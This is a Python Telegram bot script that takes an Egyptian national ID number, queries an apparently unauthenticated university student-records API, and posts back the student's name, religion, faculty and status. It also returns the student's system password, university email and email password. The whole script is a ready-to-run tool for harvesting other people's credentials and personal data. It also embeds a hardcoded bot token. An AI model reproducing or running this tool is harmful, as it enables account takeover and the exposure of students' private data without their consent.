import telebot
import requests


bot = telebot.TeleBot("6416758357:AAFil1v2BU6i9iUEfrFhJrPJOJR60nI8tro")


@bot.message_handler(commands=["start"])
def handle_start(message):
    bot.send_message(message.chat.id, "اكتب الرقم القومي")


def get_data(social_number):
    headers = {
        "user-agent": "Dart/3.1 (dart:io)",
        "host": "mis.kfs.edu.eg",
    }

    params = {
        "nid": social_number,
    }

    response = requests.get(
        "http://mis.kfs.edu.eg/shehab_ser/api/ShehabStud",
        params=params,
        headers=headers,
    )
    return response

faculities = {
    "1": "كلية الزراعة",
    "9": "كلية التربية",
    "2": "كلية الطب البيطرى",
    "7": "كلية الهندسة",
    "5": "كلية التربية النوعية",
    "8": "كلية الآداب",
    "296": "كلية العلوم",
    "488": "كلية الصيدلة",
    "536": "كلية علوم الثروة السمكيه والمصايد",
    "541": "كلية الطب",
    "540": "كلية التمريض",
    "542": "كلية العلاج الطبيعي",
    "550": "كلية طب الأسنان",
    "556": "كلية الحاسبات والمعلومات",
    "575": "كلية الألسن",
    "602": "كلية الذكاء الإصطناعي",
    "603": "كلية الحقوق",
    "597": "المعهد الفني للتمريض",
}


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if len(message.text) == 14:
        social_num = message.text
        response = get_data(social_num)
        status_code = response.status_code
        response = response.json()
        if status_code == 200:
            bot.send_message(
                message.chat.id,
                "---------- بيانات الطالب ----------",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" الاسم <pre>{response.get('FULL_NAME_AR')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" النوع <pre>{response.get('GENDER_DESCR_AR')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" الديانة <pre>{response.get('RELIGION_DESCR_AR')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" الرقم القومي <pre>{response.get('NATIONAL_NUMBER')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" الكلية <pre>{faculities.get(str(round(response.get('AS_FACULTY_INFO_ID'))))}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" المستوي <pre>{response.get('phase_parent')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" الحالة <pre>{response.get('CASE_DESCR_AR')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" النظام <pre>{response.get('METHOD_DESCR_AR')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f" الدراسة <pre>{response.get('NATURE_DESCR_AR')}</pre>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id, "---------- الحسابات ----------", parse_mode="HTML"
            )
            bot.send_message(
                message.chat.id,
                "<blockquote>كود الطالب</blockquote>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f"<code>{response.get('STUD_CODE')}</code>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                "<blockquote>الرقم السري</blockquote>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f"<code>{response.get('PASSWORD_ITEC')}</code>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                "<blockquote>الايميل الجامعي</blockquote>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f"<code>{response.get('METHOD_DESCR')}</code>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                "<blockquote>الرقم السري</blockquote>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id,
                f"<code>{response.get('METHOD_NOTES')}</code>",
                parse_mode="HTML",
            )
            bot.send_message(
                message.chat.id, "حصل يخويا , حد تاني ؟ اكتب الرقم القومي "
            )
        else:
            bot.send_message(message.chat.id, "الرقم القومي غلط , حاول تاني")
    else:
        bot.send_message(message.chat.id, "الرقم القومي غلط اتاكد انه صح و 14 رقم ")


bot.polling()
